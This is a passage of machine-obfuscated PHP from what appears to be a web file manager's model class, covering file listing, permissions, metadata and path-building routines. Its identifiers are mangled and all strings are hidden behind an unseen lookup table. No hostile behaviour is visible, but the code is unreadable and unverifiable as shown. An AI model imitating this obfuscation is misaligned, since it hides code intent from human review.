&$èÍ„¨ê’) { $èÍ„¨ê’ = $this->pathInfoFilter($èÍ„¨ê’); self::$cachePathInfo[$ô‘ş·[513] . intval($û†ÜºÚß) . $ô‘ş·[440] . $èÍ„¨ê’[$ô‘ş·[183]]] = $èÍ„¨ê’; } unset($èÍ„¨ê’); } protected function _listMake(&$ÛÆš”ú¦) { $‘ÁĞ®Ù =& $_SERVER[ •ŒÓîÆ]; $ÛÆš”ú¦[$‘ÁĞ®Ù[84]] = array(); $ÛÆš”ú¦[$‘ÁĞ®Ù[85]] = array(); foreach ($ÛÆš”ú¦[$‘ÁĞ®Ù[424]] as $“±¿ÉÄó) { $¶‹Âò‹û = $“±¿ÉÄó[$‘ÁĞ®Ù[464]] == 1 ? $‘ÁĞ®Ù[84] : $‘ÁĞ®Ù[85]; $ÛÆš”ú¦[$¶‹Âò‹û][] = $“±¿ÉÄó; } unset($ÛÆš”ú¦[$‘ÁĞ®Ù[424]]); } protected function _listAppendMeta(&$­¸»åáù, $ËæÖÄ¨Æ) { $¤„¹ß¦µ =& $_SERVER[ •ŒÓîÆ]; $ª±Û¡¾ù = array($¤„¹ß¦µ[470] => array($¤„¹ß¦µ[471], $ËæÖÄ¨Æ)); $®‚•Åï¾ = Model($¤„¹ß¦µ[514])->field($¤„¹ß¦µ[515])->where($ª±Û¡¾ù)->select(); if (!$®‚•Åï¾) { return; } $×ú‡ßçç = array($¤„¹ß¦µ[516], $¤„¹ß¦µ[517], $¤„¹ß¦µ[496]); $æÃÊíÙ¯ = array(); foreach ($®‚•Åï¾ as $Å§ø) { if (!isset($æÃÊíÙ¯[$Å§ø[$¤„¹ß¦µ[183]]])) { $æÃÊíÙ¯[$Å§ø[$¤„¹ß¦µ[183]]] = array(); } if (in_array($Å§ø[$¤„¹ß¦µ[96]], $×ú‡ßçç)) { continue; } $æÃÊíÙ¯[$Å§ø[$¤„¹ß¦µ[183]]][$Å§ø[$¤„¹ß¦µ[96]]] = $Å§ø[$¤„¹ß¦µ[429]]; } foreach ($­¸»åáù as &$šÚ«˜«) { $šÚ«˜«[$¤„¹ß¦µ[518]] = !1; if (isset($æÃÊíÙ¯[$šÚ«˜«[$¤„¹ß¦µ[183]]])) { $šÚ«˜«[$¤„¹ß¦µ[518]] = $æÃÊíÙ¯[$šÚ«˜«[$¤„¹ß¦µ[183]]]; } if ($this->fileIsLock($šÚ«˜«) && $šÚ«˜«[$¤„¹ß¦µ[466]]) { $¦¦©æÆË = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $šÚ«˜«[$¤„¹ß¦µ[466]][$¤„¹ß¦µ[467]] = AuthModel::authDisable($šÚ«˜«[$¤„¹ß¦µ[466]][$¤„¹ß¦µ[467]], $¦¦©æÆË); $šÚ«˜«[$¤„¹ß¦µ[466]][$¤„¹ß¦µ[519]][$¤„¹ß¦µ[466]] = $šÚ«˜«[$¤„¹ß¦µ[466]][$¤„¹ß¦µ[467]]; } } unset($šÚ«˜«); } protected function _listAppendFileMeta(&$–¬¾Êü, $ıûÕ‰ä) { $—Ùğ–¥î =& $_SERVER[ •ŒÓîÆ]; $½ïû‚š´ = array_to_keyvalue($–¬¾Êü, $—Ùğ–¥î[12], $—Ùğ–¥î[520]); $½ïû‚š´ = array_filter(array_unique($½ïû‚š´)); if (!$½ïû‚š´) { return; } $¸ş•Üâ† = array($—Ùğ–¥î[521] => array($—Ùğ–¥î[471], $½ïû‚š´)); $â‚”ôğ· = $—Ùğ–¥î[522]; $ìÎ†€ù = Model($—Ùğ–¥î[523])->field($â‚”ôğ·)->where($¸ş•Üâ†)->select(); $ìÎ†€ù = array_to_keyvalue($ìÎ†€ù, $—Ùğ–¥î[520]); $ØĞ¨ø† = Model($—Ùğ–¥î[524])->field($—Ùğ–¥î[525])->where($¸ş•Üâ†)->select(); $ØĞ¨ø† = $ØĞ¨ø† ? $ØĞ¨ø† : array(); $ñÎÇÎ²ú = array(); foreach ($ØĞ¨ø† as $ ’—šÙ) { if (!isset($ñÎÇÎ²ú[$ ’—šÙ[$—Ùğ–¥î[520]]])) { $ñÎÇÎ²ú[$ ’—šÙ[$—Ùğ–¥î[520]]] = array(); } $ñÎÇÎ²ú[$ ’—šÙ[$—Ùğ–¥î[520]]][$ ’—šÙ[$—Ùğ–¥î[96]]] = $ ’—šÙ[$—Ùğ–¥î[429]]; } foreach ($–¬¾Êü as &$é‚‰À›ê) { $ïÑı÷¸± = $é‚‰À›ê[$—Ùğ–¥î[520]]; if (!$ïÑı÷¸± || !is_array($ìÎ†€ù[$ïÑı÷¸±])) { continue; } $û¿á¢é = $ìÎ†€ù[$ïÑı÷¸±]; $û¿á¢é[$—Ùğ–¥î[78]] = $é‚‰À›ê[$—Ùğ–¥î[78]]; $û¿á¢é[$—Ùğ–¥î[32]] = $é‚‰À›ê[$—Ùğ–¥î[32]]; if (!$û¿á¢é[$—Ùğ–¥î[526]]) { Model($—Ùğ–¥î[523])->fileMd5Check($û¿á¢é); } if (!isset(self::$cacheFileInfo[$—Ùğ–¥î[527] . $ïÑı÷¸±])) { self::$cacheFileInfo[$—Ùğ–¥î[527] . $ïÑı÷¸±] = array_merge(array(), $û¿á¢é); } unset($ìÎ†€ù[$ïÑı÷¸±][$—Ùğ–¥î[86]]); $ú•Ã®–« = is_array($ñÎÇÎ²ú[$ïÑı÷¸±]) ? $ñÎÇÎ²ú[$ïÑı÷¸±] : array(); $é‚‰À›ê[$—Ùğ–¥î[528]] = array_merge($ú•Ã®–«, $ìÎ†€ù[$ïÑı÷¸±]); if (isset($é‚‰À›ê[$—Ùğ–¥î[528]][$—Ùğ–¥î[173]])) { $é‚‰À›ê[$—Ùğ–¥î[173]] = json_decode($é‚‰À›ê[$—Ùğ–¥î[528]][$—Ùğ–¥î[173]], !0); unset($é‚‰À›ê[$—Ùğ–¥î[528]][$—Ùğ–¥î[173]]); } } unset($é‚‰À›ê); } protected function _listAppendSourceInfo(&$­ÄÖó„ø, $ò¡İ‚‹Ì) { $Ùø’Ò›Ì =& $_SERVER[ •ŒÓîÆ]; $Ú³—ƒ— = Model($Ùø’Ò›Ì[529])->listData(); $ö±øŞç‡ = Model($Ùø’Ò›Ì[478])->listData(); $‹ŠïÌ¸ß = Model($Ùø’Ò›Ì[468])->listData(); $£ïœÑ«Ô = Model($Ùø’Ò›Ì[530])->listSimple(); $œÅ„½ë = array_to_keyvalue($Ú³—ƒ—, $Ùø’Ò›Ì[453]); $Û‹øíš¸ = array_to_keyvalue_group($ö±øŞç‡, $Ùø’Ò›Ì[86], $Ùø’Ò›Ì[479]); $ÀÒŸ½… = array_to_keyvalue($‹ŠïÌ¸ß, $Ùø’Ò›Ì[86]); $ø™¯°«ù = array_to_keyvalue_group($£ïœÑ«Ô, $Ùø’Ò›Ì[183]); foreach ($­ÄÖó„ø as &$˜ıªáôØ) { $˜ıªáôØ[$Ùø’Ò›Ì[89]] = array($Ùø’Ò›Ì[531] => 0, $Ùø’Ò›Ì[532] => 0, $Ùø’Ò›Ì[533] => 0); if (isset($ÀÒŸ½…[$˜ıªáôØ[$Ùø’Ò›Ì[183]]])) { $˜ıªáôØ[$Ùø’Ò›Ì[89]][$Ùø’Ò›Ì[534]] = 1; $˜ıªáôØ[$Ùø’Ò›Ì[89]][$Ùø’Ò›Ì[535]] = $ÀÒŸ½…[$˜ıªáôØ[$Ùø’Ò›Ì[183]]][$Ùø’Ò›Ì[32]]; } if ($Û‹øíš¸ && $œÅ„½ë && isset($Û‹øíš¸[$˜ıªáôØ[$Ùø’Ò›Ì[183]]])) { $˜ıªáôØ[$Ùø’Ò›Ì[89]][$Ùø’Ò›Ì[536]] = array(); foreach ($Û‹øíš¸[$˜ıªáôØ[$Ùø’Ò›Ì[183]]] as $ï¼„É‰„) { $èÓ‹±‚ = $œÅ„½ë[$ï¼„É‰„]; $˜ıªáôØ[$Ùø’Ò›Ì[89]][$Ùø’Ò›Ì[536]][] = array($Ùø’Ò›Ì[537] => $èÓ‹±‚[$Ùø’Ò›Ì[453]], $Ùø’Ò›Ì[473] => $èÓ‹±‚[$Ùø’Ò›Ì[32]], $Ùø’Ò›Ì[538] => $èÓ‹±‚[$Ùø’Ò›Ì[539]]); } } if ($ø™¯°«ù && isset($ø™¯°«ù[$˜ıªáôØ[$Ùø’Ò›Ì[183]]])) { $˜ıªáôØ[$Ùø’Ò›Ì[89]][$Ùø’Ò›Ì[540]] = array(); foreach ($ø™¯°«ù[$˜ıªáôØ[$Ùø’Ò›Ì[183]]] as $À¢·­) { $ÚÎ¸Çª = $Ùø’Ò›Ì[541]; if ($À¢·­[$Ùø’Ò›Ì[542]] == $Ùø’Ò›Ì[90]) { $ÚÎ¸Çª .= $Ùø’Ò›Ì[543]; } $˜ıªáôØ[$Ùø’Ò›Ì[89]][$Ùø’Ò›Ì[540]] = array_field_key($À¢·­, explode($Ùø’Ò›Ì[50], $ÚÎ¸Çª)); } } } unset($˜ıªáôØ); return $­ÄÖó„ø; } protected function _listAppendChildren(&$ åÎ…¤, $¹¨ış¯) { $ë¤‹¿ =& $_SERVER[ •ŒÓîÆ]; $øòŞ–î® = array(); $Èñî”ªî = array($ë¤‹¿[225] => 0, $ë¤‹¿[226] => 0); foreach ($ åÎ…¤ as &$¥û¦Ì¦) { if (!$¥û¦Ì¦[$ë¤‹¿[464]]) { continue; } $øòŞ–î®[] = $¥û¦Ì¦[$ë¤‹¿[183]]; } unset($¥û¦Ì¦); if (!$øòŞ–î®) { return; } $›à”Œ«› = array($ë¤‹¿[182] => array($ë¤‹¿[7], $øòŞ–î®), $ë¤‹¿[484] => 0); $€Ë×ıÜ = array($ë¤‹¿[182], $ë¤‹¿[464], $ë¤‹¿[544] => $ë¤‹¿[545]); $ÂÙåä³‡ = $this->field($€Ë×ıÜ)->where($›à”Œ«›)->group($ë¤‹¿[546])->select(); $”Ô±ü¥‰ = array(); foreach ($ÂÙåä³‡ as $µÒ«‘¸à) { $–ªŠ™ÃÙ = $µÒ«‘¸à[$ë¤‹¿[182]]; $ÈÒ¨Îæú = $µÒ«‘¸à[$ë¤‹¿[464]] == $ë¤‹¿[90] ? $ë¤‹¿[226] : $ë¤‹¿[225]; if (!isset($”Ô±ü¥‰[$–ªŠ™ÃÙ])) { $”Ô±ü¥‰[$–ªŠ™ÃÙ] = array($ë¤‹¿[225] => 0, $ë¤‹¿[226] => 0); } $”Ô±ü¥‰[$–ªŠ™ÃÙ][$ÈÒ¨Îæú] += $µÒ«‘¸à[$ë¤‹¿[545]]; } foreach ($ åÎ…¤ as &$¥û¦Ì¦) { if (!$¥û¦Ì¦[$ë¤‹¿[464]]) { continue; } $ß©¦ĞûÏ = is_array($”Ô±ü¥‰[$¥û¦Ì¦[$ë¤‹¿[183]]]) ? $”Ô±ü¥‰[$¥û¦Ì¦[$ë¤‹¿[183]]] : $Èñî”ªî; $¥û¦Ì¦[$ë¤‹¿[226]] = $ß©¦ĞûÏ[$ë¤‹¿[226]]; $¥û¦Ì¦[$ë¤‹¿[225]] = $ß©¦ĞûÏ[$ë¤‹¿[225]]; unset($¥û¦Ì¦[$ë¤‹¿[465]]); } unset($¥û¦Ì¦); } protected function _listAppendAuth(&$¾–ï”ì—) { $ã¶¥“ãÚ =& $_SERVER[ •ŒÓîÆ]; $ñ¨èÓ¦« = array(); foreach ($¾–ï”ì— as $¯Øë‡È) { if ($¯Øë‡È[$ã¶¥“ãÚ[180]] == self::TYPE_GROUP) { $ñ¨èÓ¦«[] = $¯Øë‡È[$ã¶¥“ãÚ[183]]; } } if (!$ñ¨èÓ¦«) { return; } $ÙöÙ¦… = array_to_keyvalue($¾–ï”ì—, $ã¶¥“ãÚ[183]); $„®“„Á› = Model($ã¶¥“ãÚ[547])->getSourceList($ñ¨èÓ¦«, $ÙöÙ¦…); $ñê­Ğê± = $GLOBALS[$ã¶¥“ãÚ[548]] == 1; foreach ($¾–ï”ì— as $×ÌËçöî => &$¯Øë‡È) { $¯Øë‡È[$ã¶¥“ãÚ[466]] = $„®“„Á›[$¯Øë‡È[$ã¶¥“ãÚ[183]]]; if (!$¯Øë‡È[$ã¶¥“ãÚ[466]] && $¯Øë‡È[$ã¶¥“ãÚ[180]] == self::TYPE_GROUP) { $¯Øë‡È[$ã¶¥“ãÚ[466]] = Action($ã¶¥“ãÚ[549])->pathGroupAuthMake($¯Øë‡È[$ã¶¥“ãÚ[550]]); if (!$¯Øë‡È[$ã¶¥“ãÚ[466]] && !$ñê­Ğê±) { $¯Øë‡È[$ã¶¥“ãÚ[219]] = !1; $¯Øë‡È[$ã¶¥“ãÚ[218]] = !1; } } if ($¯Øë‡È[$ã¶¥“ãÚ[466]]) { $¯Øë‡È[$ã¶¥“ãÚ[219]] = AuthModel::authCheckEdit($¯Øë‡È[$ã¶¥“ãÚ[466]][$ã¶¥“ãÚ[467]]); $¯Øë‡È[$ã¶¥“ãÚ[218]] = AuthModel::authCheckView($¯Øë‡È[$ã¶¥“ãÚ[466]][$ã¶¥“ãÚ[467]]); } $this->groupPathDisplay($¯Øë‡È); } unset($¯Øë‡È); } public function _listAppendAuthSecret(&$ŠøÖ†Áú) { $¾ÌËã¼É =& $_SERVER[ •ŒÓîÆ]; if (Model($¾ÌËã¼É[487])->get($¾ÌËã¼É[551]) != $¾ÌËã¼É[90]) { return; } static $¦«¤Ù…Ò = false; if (!$¦«¤Ù…Ò) { $Ğ‹šÀ™ = Model($¾ÌËã¼É[552]); $Çúñ¡—ì = Model($¾ÌËã¼É[553]); $¦«¤Ù…Ò = $Çúñ¡—ì->listData(); $¦«¤Ù…Ò = array_to_keyvalue($¦«¤Ù…Ò, $¾ÌËã¼É[183]); $Ğ¾ÉëÉõ = json_decode(Model($¾ÌËã¼É[487])->get($¾ÌËã¼É[554]), !0); $Ğ¾ÉëÉõ = array_to_keyvalue($Ğ¾ÉëÉõ, $¾ÌËã¼É[453]); foreach ($¦«¤Ù…Ò as $æ‡­æ => $½Âö¾ç) { $œ¤ø·ğĞ = $Ğ¾ÉëÉõ[$½Âö¾ç[$¾ÌËã¼É[555]]]; if (!$œ¤ø·ğĞ) { $Çúñ¡—ì->remove($½Âö¾ç[$¾ÌËã¼É[453]]); unset($¦«¤Ù…Ò[$æ‡­æ]); continue; } $ª¡ù¼ûó = $Ğ‹šÀ™->listData($œ¤ø·ğĞ[$¾ÌËã¼É[466]]); if (!$ª¡ù¼ûó) { $Çúñ¡—ì->remove($½Âö¾ç[$¾ÌËã¼É[453]]); unset($¦«¤Ù…Ò[$æ‡­æ]); continue; } $½Âö¾ç[$¾ÌËã¼É[466]] = $ª¡ù¼ûó; $½Âö¾ç[$¾ÌËã¼É[556]] = $œ¤ø·ğĞ; $½Âö¾ç[$¾ÌËã¼É[557]] = Model($¾ÌËã¼É[558])->getInfoSimpleOuter($½Âö¾ç[$¾ÌËã¼É[506]]); $¦«¤Ù…Ò[$æ‡­æ] = $½Âö¾ç; } } $Í¯Ü¿èÓ = USER_ID; $…ÇòŸÂÜ = array(); $ƒé¢ıá³ = $this->_listAppendPath($…ÇòŸÂÜ, !0); foreach ($ŠøÖ†Áú as $æ‡­æ => &$½Âö¾ç) { if (!is_array($½Âö¾ç[$¾ÌËã¼É[466]])) { continue; } if ($½Âö¾ç[$¾ÌËã¼É[180]] != $¾ÌËã¼É[559]) { continue; } if (isset($¦«¤Ù…Ò[$½Âö¾ç[$¾ÌËã¼É[183]]])) { $‡áíş¥¸ = $¦«¤Ù…Ò[$½Âö¾ç[$¾ÌËã¼É[183]]]; if (!is_array($½Âö¾ç[$¾ÌËã¼É[518]])) { $½Âö¾ç[$¾ÌËã¼É[518]] = array(); } $½Âö¾ç[$¾ÌËã¼É[518]][$¾ÌËã¼É[560]] = $‡áíş¥¸[$¾ÌËã¼É[555]]; $½Âö¾ç[$¾ÌËã¼É[466]][$¾ÌËã¼É[561]] = $‡áíş¥¸; $½Âö¾ç[$¾ÌËã¼É[466]][$¾ÌËã¼É[562]] = $½Âö¾ç[$¾ÌËã¼É[563]]; $½Âö¾ç[$¾ÌËã¼É[466]][$¾ÌËã¼É[564]] = $¾ÌËã¼É[90]; if ($‡áíş¥¸[$¾ÌËã¼É[506]] != $Í¯Ü¿èÓ) { $½Âö¾ç[$¾ÌËã¼É[466]][$¾ÌËã¼É[467]] = $½Âö¾ç[$¾ÌËã¼É[466]][$¾ÌËã¼É[467]] & $‡áíş¥¸[$¾ÌËã¼É[466]][$¾ÌËã¼É[466]]; } continue; } $‚Ó±àú† = $this->parentLevelArray($½Âö¾ç[$¾ÌËã¼É[565]]); $ÌÔÈØ¹ = array_reverse($‚Ó±àú†); foreach ($ÌÔÈØ¹ as $‚”ØÁÖã => $€«ùŒáä) { if (!isset($¦«¤Ù…Ò[$€«ùŒáä])) { continue; } $‡áíş¥¸ = $¦«¤Ù…Ò[$€«ùŒáä]; $½Âö¾ç[$¾ÌËã¼É[466]][$¾ÌËã¼É[561]] = $‡áíş¥¸; if ($‡áíş¥¸[$¾ÌËã¼É[506]] != $Í¯Ü¿èÓ) { $½Âö¾ç[$¾ÌËã¼É[466]][$¾ÌËã¼É[467]] = $½Âö¾ç[$¾ÌËã¼É[466]][$¾ÌËã¼É[467]] & $‡áíş¥¸[$¾ÌËã¼É[466]][$¾ÌËã¼É[466]]; } $Ü¥‚Œò– = $¾ÌËã¼É[12]; $ÄÙâÎ—¢ = count($‚Ó±àú†) - $‚”ØÁÖã; for ($ÂòŠ»Ë = 0; $ÂòŠ»Ë < $ÄÙâÎ—¢; $ÂòŠ»Ë++) { if (!isset($ƒé¢ıá³[$‚Ó±àú†[$ÂòŠ»Ë]])) { $Ü¥‚Œò– = $¾ÌËã¼É[12]; break; } $Ü¥‚Œò– = $Ü¥‚Œò– . rtrim($ƒé¢ıá³[$‚Ó±àú†[$ÂòŠ»Ë]], $¾ÌËã¼É[8]) . $¾ÌËã¼É[8]; } $½Âö¾ç[$¾ÌËã¼É[466]][$¾ÌËã¼É[562]] = rtrim($Ü¥‚Œò–, $¾ÌËã¼É[8]) . $¾ÌËã¼É[8]; break; } } unset($½Âö¾ç); } public function groupPathDisplay(&$•ÓÚœš) { $ºŒ£¤íœ =& $_SERVER[ •ŒÓîÆ]; if ($•ÓÚœš[$ºŒ£¤íœ[180]] != self::TYPE_GROUP) { return; } $±ÉÉ¸ï× = Model($ºŒ£¤íœ[566])->getInfo($•ÓÚœš[$ºŒ£¤íœ[550]]); $¤×Á¯ñ = $this->parentLevelArray($±ÉÉ¸ï×[$ºŒ£¤íœ[565]]); $©üùÌ£² = $ºŒ£¤íœ[12]; foreach ($¤×Á¯ñ as $×­šØŠŠ) { $ûªœó¼˜ = Model($ºŒ£¤íœ[566])->getInfo($×­šØŠŠ); $©üùÌ£² .= $ûªœó¼˜[$ºŒ£¤íœ[89]][$ºŒ£¤íœ[183]] . $ºŒ£¤íœ[50]; } $•ÓÚœš[$ºŒ£¤íœ[567]] = $±ÉÉ¸ï×[$ºŒ£¤íœ[182]]; $•ÓÚœš[$ºŒ£¤íœ[568]] = $±ÉÉ¸ï×[$ºŒ£¤íœ[565]]; $•ÓÚœš[$ºŒ£¤íœ[569]] = $±ÉÉ¸ï×[$ºŒ£¤íœ[570]]; $•ÓÚœš[$ºŒ£¤íœ[571]] = $©üùÌ£² . $±ÉÉ¸ï×[$ºŒ£¤íœ[89]][$ºŒ£¤íœ[183]]; } protected function _listAppendPath(&$Òñãºë¹, $¹Í·×åî = false) { $™Å™Ô²³ =& $_SERVER[ •ŒÓîÆ]; static $œæœõ“  = array(); $¢‡¼àÅ¡ = array(); $‚¯×Ÿ–¶ = array(); if ($¹Í·×åî) { return $œæœõ“ ; } foreach ($Òñãºë¹ as &$§ş»¨Ã) { $ç‘åê†› = $§ş»¨Ã[$™Å™Ô²³[183]]; if ($§ş»¨Ã[$™Å™Ô²³[464]] == $™Å™Ô²³[90] && $§ş»¨Ã[$™Å™Ô²³[182]] != 0) { $œæœõ“ [$ç‘åê†›] = $§ş»¨Ã[$™Å™Ô²³[32]]; } if ($§ş»¨Ã[$™Å™Ô²³[464]] == $™Å™Ô²³[90] && $§ş»¨Ã[$™Å™Ô²³[182]] == 0) { $œæœõ“ [$ç‘åê†›] = $this->_listAppendPathRoot($§ş»¨Ã, array()); } if (isset($‚¯×Ÿ–¶[$§ş»¨Ã[$™Å™Ô²³[565]]])) { continue; } $‚¯×Ÿ–¶[$§ş»¨Ã[$™Å™Ô²³[565]]] = !0; $Çİˆèë³ = $this->parentLevelArray($§ş»¨Ã[$™Å™Ô²³[565]]); foreach ($Çİˆèë³ as $’ŸÒ´¤Ü => $ºÅÜìª) { if (isset($œæœõ“ [$ºÅÜìª])) { continue; } if ($’ŸÒ´¤Ü == 0) { $œæœõ“ [$ºÅÜìª] = $this->_listAppendPathRoot($§ş»¨Ã, $Çİˆèë³); } if ($’ŸÒ´¤Ü != 0) { $¢‡¼àÅ¡[] = $ºÅÜìª; } } } unset($§ş»¨Ã); $¢‡¼àÅ¡ = array_unique($¢‡¼àÅ¡); if (count($¢‡¼àÅ¡) > 0) { $¿ş­ºùŒ = array($™Å™Ô²³[470] => array($™Å™Ô²³[471], $¢‡¼àÅ¡)); if (count($¢‡¼àÅ¡) == 1) { $Æ·˜’ôƒ = $this->sourceInfo($¢‡¼àÅ¡[0]); $–¥“Û—Û = is_array($Æ·˜’ôƒ) ? array($Æ·˜’ôƒ) : !1; } else { $–¥“Û—Û = $this->field($™Å™Ô²³[572])->where($¿ş­ºùŒ)->select(); } if (!$–¥“Û—Û) { $–¥“Û—Û = array(); } foreach ($–¥“Û—Û as $ú«İı) { $œæœõ“ [$ú«İı[$™Å™Ô²³[183]]] = $ú«İı[$™Å™Ô²³[32]]; } } $ìŒ¶Œ˜æ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $óøÜŠ™• = array(); foreach ($Òñãºë¹ as &$§ş»¨Ã) { $„¬Ï™Ó€ = $§ş»¨Ã[$™Å™Ô²³[565]]; $×…Ÿğó° = $™Å™Ô²³[12]; if (isset($óøÜŠ™•[$„¬Ï™Ó€])) { $×…Ÿğó° = $óøÜŠ™•[$„¬Ï™Ó€]; } else { $Çİˆèë³ = $this->parentLevelArray($§ş»¨Ã[$™Å™Ô²³[565]]); foreach ($Çİˆèë³ as $’ŸÒ´¤Ü => $ºÅÜìª) { if (isset($œæœõ“ [$ºÅÜìª])) { $×…Ÿğó° .= $œæœõ“ [$ºÅÜìª] . $™Å™Ô²³[8]; } } $óøÜŠ™•[$„¬Ï™Ó€] = $×…Ÿğó°; } $×…Ÿğó° .= $§ş»¨Ã[$™Å™Ô²³[32]]; if ($§ş»¨Ã[$™Å™Ô²³[464]] == $™Å™Ô²³[90]) { $×…Ÿğó° .= $™Å™Ô²³[8]; } $§ş»¨Ã[$™Å™Ô²³[563]] = str_replace($™Å™Ô²³[573], $™Å™Ô²³[8], $×…Ÿğó°); if ($§ş»¨Ã[$™Å™Ô²³[182]] == $™Å™Ô²³[214]) { $§ş»¨Ã[$™Å™Ô²³[32]] = trim($œæœõ“ [$§ş»¨Ã[$™Å™Ô²³[183]]], $™Å™Ô²³[8]); $§ş»¨Ã[$™Å™Ô²³[563]] = $§ş»¨Ã[$™Å™Ô²³[32]] . $™Å™Ô²³[8]; } if (intval($§ş»¨Ã[$™Å™Ô²³[180]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($§ş»¨Ã, $Çİˆèë³, $ìŒ¶Œ˜æ); } } unset($§ş»¨Ã); return $Òñãºë¹; } private function _listAppendPathRecycle(&$áÔçü¨, $ŸÀíÉ£·, $ÛÁÓÎ´) { $éøÍéó¨ =& $_SERVER[ •ŒÓîÆ]; if (!in_array($ÛÁÓÎ´, $ŸÀíÉ£·) && $áÔçü¨[$éøÍéó¨[183]] != $ÛÁÓÎ´) { return; } $ÙÑ›·¿ = explode($éøÍéó¨[8], trim($áÔçü¨[$éøÍéó¨[563]], $éøÍéó¨[8])); $äÛúëìÓ = implode($éøÍéó¨[8], array_slice($ÙÑ›·¿, 2)); $áÔçü¨[$éøÍéó¨[563]] = $éøÍéó¨[8] . LNG($éøÍéó¨[574]) . $éøÍéó¨[8] . ltrim($äÛúëìÓ, $éøÍéó¨[8]); $áÔçü¨[$éøÍéó¨[565]] = $éøÍéó¨[575] . implode($éøÍéó¨[50], array_slice($ŸÀíÉ£·, 1)) . $éøÍéó¨[50]; if ($áÔçü¨[$éøÍéó¨[183]] == $ÛÁÓÎ´) { $áÔçü¨[$éøÍéó¨[565]] = $éøÍéó¨[575]; $áÔçü¨[$éøÍéó¨[182]] = $éøÍéó¨[214]; $áÔçü¨[$éøÍéó¨[32]] = LNG($éøÍéó¨[574]); } $áÔçü¨[$éøÍéó¨[576]] = $éøÍéó¨[577]; } protected function _listAppendPathRoot(&$Ñœ¡£–¿, $íÛ³¡Ç) { $Ì™ğ€ Ô =& $_SERVER[ •ŒÓîÆ]; static $şÏÜç‚ = false; $ñ¡ñ†¼Ü = $Ì™ğ€ Ô[12]; if ($Ñœ¡£–¿[$Ì™ğ€ Ô[180]] == self::TYPE_USER) { if ($Ñœ¡£–¿[$Ì™ğ€ Ô[550]] == USER_ID) { $ñ¡ñ†¼Ü = LNG($Ì™ğ€ Ô[578]); if ($şÏÜç‚ === !1) { $õ¹½·¤õ = Model($Ì™ğ€ Ô[579])->getInfoFull(USER_ID); $şÏÜç‚ = _get($õ¹½·¤õ, $Ì™ğ€ Ô[580], $Ì™ğ€ Ô[12]); } if ($íÛ³¡Ç && $íÛ³¡Ç[0] == $şÏÜç‚ || !$íÛ³¡Ç && $Ñœ¡£–¿[$Ì™ğ€ Ô[183]] == $şÏÜç‚) { $ñ¡ñ†¼Ü = LNG($Ì™ğ€ Ô[581]); $Ñœ¡£–¿[$Ì™ğ€ Ô[582]] = $Ì™ğ€ Ô[583]; } if (!$íÛ³¡Ç) { $Ñœ¡£–¿[$Ì™ğ€ Ô[32]] = $ñ¡ñ†¼Ü; } } else { $Ñœ¡£–¿[$Ì™ğ€ Ô[584]] = Model($Ì™ğ€ Ô[558])->getInfoSimpleOuter($Ñœ¡£–¿[$Ì™ğ€ Ô[550]]); $ñ¡ñ†¼Ü = LNG($Ì™ğ€ Ô[585]) . $Ì™ğ€ Ô[165] . $Ñœ¡£–¿[$Ì™ğ€ Ô[584]][$Ì™ğ€ Ô[32]] . $Ì™ğ€ Ô[167]; } } else { if ($Ñœ¡£–¿[$Ì™ğ€ Ô[180]] == self::TYPE_GROUP) { $¯Îã˜ƒ† = Model($Ì™ğ€ Ô[566])->getInfoSimple($Ñœ¡£–¿[$Ì™ğ€ Ô[550]]); $ñ¡ñ†¼Ü = $¯Îã˜ƒ†[$Ì™ğ€ Ô[32]]; } else { if ($Ñœ¡£–¿[$Ì™ğ€ Ô[180]] == self::TYPE_SYSTEM) { $ñ¡ñ†¼Ü = $Ì™ğ€ Ô[586]; } } } $ñ¡ñ†¼Ü = $ñ¡ñ†¼Ü ? $Ì™ğ€ Ô[8] . $ñ¡ñ†¼Ü . $Ì™ğ€ Ô[8] : $Ì™ğ€ Ô[8]; return $ñ¡ñ†¼Ü; } protected function _listAppendUser(&$§Š±êš©) { $“îĞÙ±™ =& $_SERVER[ •ŒÓîÆ]; $”ÖÛ×­ = array_to_keyvalue($§Š±êš©, $“îĞÙ±™[12], $“îĞÙ±™[506]); $ŒÉĞÍãö = array_to_keyvalue($§Š±êš©, $“îĞÙ±™[12], $“îĞÙ±™[508]); $–Ü Ÿ = array_merge($”ÖÛ×­, $ŒÉĞÍãö); $»ÈĞÛ… = Model($“îĞÙ±™[579])->userListInfo($–Ü Ÿ); foreach ($§Š±êš© as &$¯ñÄÅÉö) { $âÏüãŠ§ = $¯ñÄÅÉö[$“îĞÙ±™[506]]; $¯ñÄÅÉö[$“îĞÙ±™[506]] = $»ÈĞÛ…[$âÏüãŠ§] ? $»ÈĞÛ…[$âÏüãŠ§] : !1; $âÏüãŠ§ = $¯ñÄÅÉö[$“îĞÙ±™[508]]; $¯ñÄÅÉö[$“îĞÙ±™[508]] = $»ÈĞÛ…[$âÏüãŠ§] ? $»ÈĞÛ…[$âÏüãŠ§] : !1; if (isset($¯ñÄÅÉö[$“îĞÙ±™[518]]) && $¯ñÄÅÉö[$“îĞÙ±™[518]][$“îĞÙ±™[587]]) { $½×ş«‰Ğ = $GLOBALS[$“îĞÙ±™[6]][$“îĞÙ±™[91]][$“îĞÙ±™[588]]; if ($¯ñÄÅÉö[$“îĞÙ±™[518]][$“îĞÙ±™[589]] <= time() - $½×ş«‰Ğ) { $this->metaSet($¯ñÄÅÉö[$“îĞÙ±™[183]], $“îĞÙ±™[587], null); $this->metaSet($¯ñÄÅÉö[$“îĞÙ±™[183]], $“îĞÙ±™[589], null); unset($¯ñÄÅÉö[$“îĞÙ±™[518]][$“îĞÙ±™[587]]); continue; } $Óì†ôÙ = $¯ñÄÅÉö[$“îĞÙ±™[518]][$“îĞÙ±™[587]]; $¯ñÄÅÉö[$“îĞÙ±™[518]][$“îĞÙ±™[590]] = Model($“îĞÙ±™[579])->getInfoSimpleOuter($Óì†ôÙ); } } unset($¯ñÄÅÉö); } public function parentLevelArray($ôëò–Ó€) { $Í¶Çñ¿ü =& $_SERVER[ •ŒÓîÆ]; $ôëò–Ó€ = explode($Í¶Çñ¿ü[50], trim($ôëò–Ó€, $Í¶Çñ¿ü[50])); return array_remove_value($ôëò–Ó€, $Í¶Çñ¿ü[214]); } public function listAll($”¼Çş) { $Â²°õß„ =& $_SERVER[ •ŒÓîÆ]; $ØùÖØ…Ñ = $this->sourceInfo($”¼Çş); $—Ú¸æÉ± = array($Â²°õß„[591] => array($Â²°õß„[592], $ØùÖØ…Ñ[$Â²°õß„[565]] . 